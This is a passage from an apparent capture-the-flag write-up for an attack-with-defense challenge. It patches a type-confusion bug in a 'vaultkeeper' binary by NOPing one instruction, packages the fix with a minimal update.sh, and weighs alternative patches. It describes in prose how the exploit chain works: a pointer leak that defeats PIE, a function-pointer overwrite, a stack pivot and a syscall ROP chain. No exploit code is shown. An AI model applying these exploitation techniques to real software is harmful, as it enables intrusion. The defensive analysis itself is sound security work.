`update.sh`: **`mv`, `cp`, `chmod`**. So the fix must be a *pre-patched binary*
installed by an `update.sh` that shells out only to those commands.

##### 5.1 Root cause and the minimal fix

Both the leak and the code-exec depend on **`convert_vault` flipping a key vault
to a text vault**. Without that type flip:

- `show` never text-dumps a KeyBox, so there is no pointer leak and PIE holds.
- `edit` never text-writes a KeyBox, so `KeyBox[0]` can't be overwritten: no
  stack pivot, no ROP.

`clone`'s aliasing alone is harmless (both aliases stay key vaults with the
legit `default_key_view`, and `edit`-key only writes the bounded `note` field).

The conversion is a single instruction:

```
0x2295:  c7 40 04 01 00 00 00     mov dword [rax+4], 1   ; v->type = 1
```

Neutralize it by NOP-ing those 7 bytes (`file offset == vaddr` for this PIE):

```
c7 40 04 01 00 00 00   ->   90 90 90 90 90 90 90
```

`convert` still prints `"converted in-place"`, which keeps the service-level
check happy, but it is now a no-op. The vault stays a key vault, so `show` and
`edit` keep treating it as a key: `show` prints only `key_id`, a masked material
digest, and the note (no pointers), and `edit` only writes the bounded note. The
exploit chain is dead.

Patch script (run once locally to produce the patched binary):

```python
data = bytearray(open('vaultkeeper','rb').read())
off = 0x2295
assert data[off:off+7] == bytes.fromhex('c7400401000000')
data[off:off+7] = b'\x90' * 7          # kill v->type = 1 in convert_vault
open('vaultkeeper','wb').write(data)
```

##### 5.2 `update.sh` (whitelist-only)

```sh
#!/bin/sh
cp vaultkeeper /app/vaultkeeper
chmod 755 /app/vaultkeeper
```

Only `cp` and `chmod` are used, both whitelisted. Avoid helpers like `dirname`;
they are not on the whitelist. The archive is extracted and `update.sh` runs from
that directory, so a relative source path is enough.

##### 5.3 Package

```
patch.tar.gz
├── update.sh      (cp + chmod only)
└── vaultkeeper    (patched: convert_vault type-flip NOP'd)
```

```
$ tar -czf patch.tar.gz update.sh vaultkeeper
```

##### 5.4 Alternatives considered

A few other patches would also close the hole, but each is worse on either
robustness or SLA:

- Force `convert` to always take the "only key vaults can be exported" branch
  (patch the `je` at `0x224e` to two NOPs). This works, but every `export` then
  fails with an error message, which reads as broken to an SLA checker.
- Zero the vault `size` after conversion so `show` dumps nothing and `edit` can
  write nothing. The clean way to do that (`mov qword [rax+4], 1`, which sets
  type and clears the low half of `size`) is 8 bytes and does not fit the 7-byte
  slot, so it would shift the following instruction. Not worth it.
- Rewrite the whole `convert_vault` to deep-copy `material` into a fresh text
  buffer. This is the "correct" fix, but it needs new code and a spare buffer,
  and it is far more likely to break the binary than a 7-byte NOP.

The NOP keeps `export` returning success while removing its only dangerous side
effect, so it is the lowest-risk option that still passes the functional check.

##### 5.5 Residual attack surface

With the type flip gone, the remaining primitives are bounded:

- No pointer leak. `show` on a key vault prints `key_id`, a masked material
  digest (low nibbles only), and the note. `show` on a text vault dumps that
  vault's own text buffer, which the attacker wrote. Neither reveals a code or
  heap address, so PIE holds.
- No out-of-bounds write. `edit` on a text vault is bounded by `size`, and
  `edit` on a key vault writes only the `note` field. `KeyBox[0]` (the `view`
  pointer) can no longer be reached, so the `call [box]` in `show` always lands
  on `default_key_view`.
- `clone` still aliases, but both aliases stay key vaults with the same `view`
  pointer, so aliasing gives nothing on its own.

Without a leak there is no way to point the ROP chain at real addresses, and
without a write to `KeyBox[0]` there is no control-flow hijack. The chain needs
both, and the patch removes the single step that produced them.

##### 5.6 Verification

- Exploit against the patched binary: the leak path is dead. `show` on the
  "exported" vault emits a key view, not a `text dump:`, so there is no PIE leak
  and no flag.
- SLA intact: create text/key, show, edit, clone, and list all behave normally.
  `export` still prints `"converted in-place"`; it is just harmless now.

#### Takeaways

- Shallow copy means aliasing. Cloning a container by copying its handle,
  embedded pointers included, leaves two owners of one buffer.
- In-place type "conversion" is type confusion. Relabeling a structure's type
  without migrating its contents lets one code path read another type's layout as
  its own, here dumping and overwriting a KeyBox as raw text.
- A leaked object with an embedded function pointer helps twice: the `view`
  pointer defeats PIE, and it is also a call target you can overwrite.
- Planted gadgets plus a pivot point to the intended solution: a self-contained
  syscall ROP chain that never touches libc, which suits a `seccomp` ORW policy.
- A minimal, behavior-preserving patch is the right call for AWDT. A 7-byte NOP
  that removes the one dangerous state transition kills the chain while the
  functional checks still pass.
